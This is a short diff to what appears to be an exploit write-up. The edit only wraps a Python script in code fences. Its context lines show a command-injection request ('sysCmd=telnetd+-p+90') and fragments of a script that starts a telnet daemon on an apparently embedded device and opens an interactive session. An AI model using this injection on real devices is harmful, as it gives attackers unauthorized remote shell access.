@@ -57,6 +57,7 @@ submit-url=1234&sysCmd=telnetd+-p+90
 
  
 Script:
+``` python
 import requests
 import sys
 import struct
@@ -89,5 +90,5 @@ if __name__ == "__main__":
 	syscmd('telnetd -p '+str(port))
 	inter()
 	
-
+``` 
 
